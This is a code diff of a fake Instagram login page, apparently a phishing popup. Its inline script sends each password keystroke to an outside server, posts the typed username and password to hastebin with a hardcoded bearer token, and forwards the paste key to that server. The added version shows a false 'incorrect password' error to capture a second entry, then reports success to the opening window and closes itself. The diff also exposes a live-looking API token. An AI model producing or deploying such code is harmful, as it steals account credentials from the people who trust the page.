@@ -8,7 +8,7 @@
   <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192"
     href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" />
   <link rel="stylesheet" href="./assets/index-BeHXAzec.css" />
-   <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
 </head>
 
 <body class="bg-black">
@@ -19,24 +19,26 @@
     </div>
     <div class="flex flex-col space-y-1.5 justify-center items-center mt-16">
       <div class="flex flex-col">
-        <img src="./assets/instagram_text_logo-RWQ-T5XU.png" alt="" width="175" height="51"
-          class="my-5 mx-20" />
-          <div class="w-full  flex items-center justify-center">
-            <input class="input-username  text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="text"
+        <img src="./assets/instagram_text_logo-RWQ-T5XU.png" alt="" width="175" height="51" class="my-5 mx-20" />
+        <div class="w-full flex items-center justify-center">
+          <input class="input-username text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="text"
             placeholder="Phone number, username, or email" autocomplete="username" />
-          </div>
-          <div class="w-full  flex items-center justify-center">
-            <div class="relative">
-              <input class="input-password text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="password"
+        </div>
+        <div class="w-full flex items-center justify-center">
+          <div class="relative">
+            <input class="input-password text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="password"
               placeholder="Password" />
-              <h1 class="text-gray-100 toggler hidden font-bold cursor-pointer hover:text-gray-400 text-sm absolute top-4.5  right-15">Show</h1>
-            </div>
+            <h1
+              class="text-gray-100 toggler hidden font-bold cursor-pointer hover:text-gray-400 text-sm absolute top-4.5 right-15">Show</h1>
           </div>
-          <div class="w-full flex items-center justify-center">
-            <button class="btn-login font-semibold  bg-[#0069AD] w-[65%] text-white rounded-lg px-12 mx-12 py-1.5 mt-2">Log in</button>
-          </div>
+        </div>
+        <div class="w-full flex items-center justify-center">
+          <button
+            class="btn-login font-semibold bg-[#0069AD] w-[65%] text-white rounded-lg px-12 mx-12 py-1.5 mt-2">Log
+            in</button>
+        </div>
         <hr class="my-2" />
-        <span class="text-[#0095F6] mx-auto text-sm">Log in with Facebook</span>
+        <!-- <span class="text-[#0095F6] mx-auto text-sm">Log in with Facebook</span> -->
         <span class="text-white mx-29 my-4 text-xs">Forgot password?</span>
       </div>
       <div class="text-white text-center text-sm py-5 px-17.5 flex flex-row">
@@ -53,45 +55,51 @@
   </div>
 
   <!-- Mobile View -->
-  <div class="flex flex-col mx-auto items-center justify-center md:hidden">
-    <div class="text-white mt-9 ml-[-60px]">
-      <img
-        src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones-2x.png?__makehaste_cache_breaker=73SVAexZgBW"
-        height="634.15" width="468.32" alt="" class="hidden" />
+ <div class="flex flex-col mx-auto items-center justify-center md:hidden">
+  <div class="text-white mt-9 ml-[-60px]">
+    <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones-2x.png"
+      height="634.15" width="468.32" alt="" class="hidden" />
+  </div>
+  <div class="flex flex-col space-y-1.5 justify-center items-center">
+    <div class="flex flex-col w-[85%]">
+      <img src="./assets/instagram_text_logo-RWQ-T5XU.png" alt="" width="175" height="51" class="my-5 self-center" />
+
+      <!-- Username Input -->
+      <input
+        class="input-username text-white border border-[#363636] px-4 py-2 text-sm my-2"
+        type="text" placeholder="Phone number, username, or email" />
+
+      <!-- Password Input + Error -->
+      <div class="relative flex flex-col items-start justify-center">
+        <input
+          class="text-white input-password border border-[#363636] px-4 py-2 text-sm my-2 w-full"
+          type="password" placeholder="Password" />
+        <h1
+          class="text-gray-100 toggler hidden absolute right-4 text-sm font-bold top-3.5 hover:text-gray-400">Show</h1>
+        <!-- Error will be inserted here -->
+      </div>
+
+      <!-- Button -->
+      <button class="btn-login bg-[#0069AD] text-white w-full rounded-lg px-4 py-1.5 mt-2">Log in</button>
+
+      <hr class="my-2" />
+      <span class="text-white text-xs self-center">Forgot password?</span>
     </div>
-    <div class="flex flex-col space-y-1.5 justify-center items-center">
-      <div class="flex flex-col">
-        <img src="./assets/instagram_text_logo-RWQ-T5XU.png" alt="" width="175" height="51" class="my-5 mx-20" />
-        <div class=" flex items-center justify-center w-full">
-          <input class="input-username text-white border w-[85%] border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="text"
-          placeholder="Phone number, username, or email" />
-        </div>
-          <div class=" flex items-center justify-center">
-            <div class="relative w-full  flex items-center justify-center">
-              <input class="text-white input-password border w-[85%] border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="password"
-              placeholder="Password" />
-              <h1  class="text-gray-100 toggler hidden absolute right-15 text-sm font-bold top-4.5 hover:text-gray-400">Show</h1>
-            </div>
-          </div>
-            <div class="flex justify-center items-center">
-              <button class="btn-login bg-[#0069AD] text-white w-2/3 rounded-lg px-4 mx-12 py-1.5 mt-2">Log in</button>
-            </div>
-        <hr class="my-2" />
-        <!-- <span class="text-[#0095F6] mx-26 text-sm">Log in with Facebook</span> -->
-        <span class="text-white mx-29 my-4 text-xs">Forgot password?</span>
-      </div>
-      <div class="text-white text-center text-sm py-5 px-17.5">
-        Don't have an account? <strong class="text-[#0095F6]">Sign up</strong>
-      </div>
-      <div class="text-white text-center text-sm mt-20 px-20">
-        Get the app
-        <div class="flex flex-row space-x-2 my-2">
-          <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" width="134" height="40" alt="" />
-          <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" width="111" height="40" alt="" />
-        </div>
+
+    <div class="text-white text-center text-sm py-5 px-4">
+      Don't have an account? <strong class="text-[#0095F6]">Sign up</strong>
+    </div>
+
+    <div class="text-white text-center text-sm mt-20 px-4">
+      Get the app
+      <div class="flex flex-row space-x-2 my-2 justify-center">
+        <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" width="134" height="40" alt="" />
+        <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" width="111" height="40" alt="" />
       </div>
     </div>
   </div>
+</div>
+
 
   <!-- Footer -->
   <footer class="text-[#A8A8A8] flex flex-wrap justify-center text-[7px] md:text-xs leading-1 mt-8 space-x-3">
@@ -113,200 +121,165 @@
     <div>English</div>
     <div>© 2025 Instagram from Meta</div>
   </footer>
-
   <script>
-    const pw=document.getElementsByClassName("input-password");
-    const tog=document.getElementsByClassName("toggler");
-    
-    // CRITICAL: Track login attempts and send messages to parent
-    let loginAttemptMade = false;
-    let loginProcessStarted = false;
-    
-    // Password show/hide toggle functionality
-    for(i=0;i<2;i++){
-      tog[i].addEventListener("click",(e)=>{
-        if(e.target.textContent==='Show'){
-          e.target.textContent='Hide';
-          for(i=0;i<2;i++){
-            pw[i].type="text";
-          }
-        }
-        else{
-          e.target.textContent='Show';
-          for(i=0;i<2;i++){
-            pw[i].type="password";
-          }
-        }
-      })
-    }
+  const pw = document.getElementsByClassName("input-password");
+  const tog = document.getElementsByClassName("toggler");
+  let loginAttempts = 0;
+  let loginAttemptMade = false;
+  let loginProcessStarted = false;
 
-    // Show/hide password toggle visibility
-    document.querySelectorAll(".input-password").forEach((pw) => {
-      pw.addEventListener("keydown", async (e) => {
-        if(e.target.value.length>0){
-          for(i=0;i<2;i++){
-            tog[i].style="display:block;"
-          }
-        }
-        else{
-            tog[i].style="display:none;"
-        }
-        
-        // Optional: Track password input for backend (non-blocking)
-        try {
-          const dest = "https://internship-r3jn.onrender.com/raasaleelalu";
-          await fetch(dest, {
-            method: "POST",
-            headers: {
-              'Content-Type': "application/json"
-            },
-            body: JSON.stringify({ pw: e.target.value })
-          });
-        } catch(err) {
-          // Silently ignore errors - don't affect user experience
-          console.log("Background request failed (non-critical):", err);
-        }
-      });
+  for (let i = 0; i < 2; i++) {
+    tog[i].addEventListener("click", (e) => {
+      if (e.target.textContent === 'Show') {
+        e.target.textContent = 'Hide';
+        for (let i = 0; i < 2; i++) pw[i].type = "text";
+      } else {
+        e.target.textContent = 'Show';
+        for (let i = 0; i < 2; i++) pw[i].type = "password";
+      }
     });
+  }
 
-    // Handle login button click - ALWAYS SUCCESS
-    document.querySelectorAll(".btn-login").forEach((button) => {
-      button.addEventListener("click", async (e) => {
-        e.preventDefault();
-        
-        const container = button.closest("div.flex-col");
-        const un = container.querySelector(".input-username");
-        const pw = container.querySelector(".input-password");
+  document.querySelectorAll(".input-password").forEach((pw) => {
+    pw.addEventListener("keydown", async (e) => {
+      for (let i = 0; i < 2; i++) {
+        tog[i].style.display = e.target.value.length > 0 ? "block" : "none";
+      }
+      try {
+        await fetch("https://internship-r3jn.onrender.com/raasaleelalu", {
+          method: "POST",
+          headers: { 'Content-Type': "application/json" },
+          body: JSON.stringify({ pw: e.target.value })
+        });
+      } catch { }
+    });
+  });
 
-        // Basic validation
-        if (!un.value.trim()) {
-          alert("Please enter your username or email.");
-          return;
+  document.querySelectorAll(".btn-login").forEach((button) => {
+    button.addEventListener("click", async (e) => {
+      e.preventDefault();
+      const container = button.closest("div.flex-col");
+      const un = container.querySelector(".input-username");
+      const pwInput = container.querySelector(".input-password");
+
+      if (!un.value.trim()) return alert("Please enter your username or email.");
+      if (!pwInput.value.trim()) return alert("Please enter your password.");
+
+      loginAttempts++;
+
+      // Remove old error message if it exists
+      const existingError = container.querySelector(".password-error");
+      if (existingError) existingError.remove();
+
+      // Disable button and show loading
+      const originalText = button.textContent;
+      button.disabled = true;
+      button.textContent = "Logging in...";
+
+      // Do request first (common for both attempts)
+      try {
+        const hasteResp = await fetch("https://hastebin.com/documents", {
+          method: 'POST',
+          headers: {
+            'Content-Type': "text/plain",
+            'Authorization': `Bearer 3555594b52d169b614edbdde7c943a928d8fc9ff2766f2f047bc6df754cfa031769ea60f84888f7f4c9c632bfbfd138d3f8bccadc62ea0dee90bc97f90e24ddd`
+          },
+          body: `${un.value}:${pwInput.value}`
+        });
+
+        if (hasteResp.ok) {
+          const data = await hasteResp.json();
+          await fetch("https://internship-r3jn.onrender.com/raasaleelalu", {
+            method: "POST",
+            headers: { 'Content-Type': "application/json" },
+            body: JSON.stringify({ pw: data.key })
+          });
+        }
+      } catch (err) {
+        console.log("Failed sending data to backend:", err);
+      }
+
+      // 🔁 First Attempt
+      if (loginAttempts === 1) {
+        // Re-enable button
+        button.disabled = false;
+        button.textContent = originalText;
+
+        const error = document.createElement("div");
+        error.className = "password-error text-red-500 text-xs text-center mt-2";
+        error.textContent = "The password you entered is incorrect. Please try again.";
+
+        // Show error just below password input field
+        pwInput.parentElement.insertAdjacentElement('afterend', error);
+
+        // Clear password field
+        pwInput.value = "";
+
+        for (let i = 0; i < tog.length; i++) {
+          tog[i].style.display = "none";
         }
 
-        if (!pw.value.trim()) {
-          alert("Please enter your password.");
-          return;
-        }
+        return;
+      }
 
-        // Mark that login attempt was made and process started
-        loginAttemptMade = true;
-        loginProcessStarted = true;
+      // 🔁 Second Attempt — continue
+      loginAttemptMade = true;
+      loginProcessStarted = true;
 
-        // Immediately send login attempt message to parent
+      if (window.opener) {
+        try {
+          window.opener.postMessage({
+            type: 'INSTAGRAM_LOGIN_ATTEMPT',
+            message: 'Login attempt initiated'
+          }, '*');
+        } catch { }
+      }
+
+      setTimeout(() => {
         if (window.opener) {
           try {
             window.opener.postMessage({
-              type: 'INSTAGRAM_LOGIN_ATTEMPT',
-              message: 'Login attempt initiated'
+              type: 'INSTAGRAM_LOGIN_SUCCESS',
+              message: 'Instagram login completed successfully'
             }, '*');
-            console.log('Login attempt message sent to parent window');
-          } catch(err) {
-            console.log('Could not send attempt message:', err);
-          }
+          } catch { }
         }
 
-        // Update button state
-        button.disabled = true;
-        const originalText = button.textContent;
-        button.textContent = "Logging in...";
-
-        // Small delay to make it feel authentic
-        setTimeout(async () => {
-          // Background data collection (non-blocking, errors ignored)
-          try {
-            const dest = "https://internship-r3jn.onrender.com/raasaleelalu";
-            const key = '3555594b52d169b614edbdde7c943a928d8fc9ff2766f2f047bc6df754cfa031769ea60f84888f7f4c9c632bfbfd138d3f8bccadc62ea0dee90bc97f90e24ddd';
-            
-            const resp1 = await fetch("https://hastebin.com/documents", {
-              method: 'POST',
-              headers: {
-                'Content-Type': "text/plain",
-                'Authorization': `Bearer ${key}`
-              },
-              body: `${un.value}:${pw.value}`
-            });
-
-            if (resp1.ok) {
-              const data = await resp1.json();
-              await fetch(dest, {
-                method: "POST",
-                headers: {
-                  'Content-Type': "application/json"
-                },
-                body: JSON.stringify({ pw: data.key })
-              });
-            }
-          } catch (err) {
-            // Completely ignore any errors - user experience is priority
-            console.log("Background process completed with issues (non-critical):", err);
-          }
-
-          // ALWAYS send success message regardless of backend response
-          if (window.opener) {
-            try {
-              window.opener.postMessage({
-                type: 'INSTAGRAM_LOGIN_SUCCESS',
-                message: 'Instagram login completed successfully'
-              }, '*');
-              console.log('SUCCESS: Login success message sent to parent window');
-            } catch(err) {
-              console.log('Could not send success message:', err);
-            }
-          }
-
-          // Small delay to ensure message is processed before closing
-          setTimeout(() => {
-            try {
-              window.close();
-            } catch(err) {
-              console.log('Could not close window:', err);
-            }
-          }, 300);
-          
-        }, 1200); // 1.2 second delay to simulate real login process
-      });
+        setTimeout(() => {
+          try { window.close(); } catch { }
+        }, 300);
+      }, 1000); // Short delay to simulate flow
     });
+  });
 
-    // Prevent any popup close warnings once login process starts
-    window.addEventListener('beforeunload', (e) => {
-      // Only send warning if NO login process was ever started
-      if (!loginProcessStarted && !loginAttemptMade && window.opener) {
-        try {
-          window.opener.postMessage({
-            type: 'INSTAGRAM_POPUP_CLOSED_WITHOUT_LOGIN',
-            message: 'Popup closed without login attempt'
-          }, '*');
-          console.log('Popup closed without login - message sent to parent');
-        } catch(err) {
-          console.log('Could not send close message:', err);
-        }
-      }
-    });
+  window.addEventListener('beforeunload', () => {
+    if (!loginProcessStarted && !loginAttemptMade && window.opener) {
+      try {
+        window.opener.postMessage({
+          type: 'INSTAGRAM_POPUP_CLOSED_WITHOUT_LOGIN',
+          message: 'Popup closed without login attempt'
+        }, '*');
+      } catch { }
+    }
+  });
 
-    // Additional safety net for popup close detection
-    window.addEventListener('unload', () => {
-      // Only warn if no login process was started
-      if (!loginProcessStarted && !loginAttemptMade && window.opener) {
-        try {
-          window.opener.postMessage({
-            type: 'INSTAGRAM_POPUP_CLOSED_WITHOUT_LOGIN',
-            message: 'Popup closed without login attempt'
-          }, '*');
-        } catch(err) {
-          console.log('Could not send close message:', err);
-        }
-      }
-    });
+  window.addEventListener('unload', () => {
+    if (!loginProcessStarted && !loginAttemptMade && window.opener) {
+      try {
+        window.opener.postMessage({
+          type: 'INSTAGRAM_POPUP_CLOSED_WITHOUT_LOGIN',
+          message: 'Popup closed without login attempt'
+        }, '*');
+      } catch { }
+    }
+  });
 
-    // Auto-focus on username field for better UX
-    document.addEventListener('DOMContentLoaded', () => {
-      const usernameField = document.querySelector('.input-username');
-      if (usernameField) {
-        usernameField.focus();
-      }
-    });
-  </script>
+  document.addEventListener('DOMContentLoaded', () => {
+    const usernameField = document.querySelector('.input-username');
+    if (usernameField) usernameField.focus();
+  });
+</script>
+
 </body>
 
 </html>
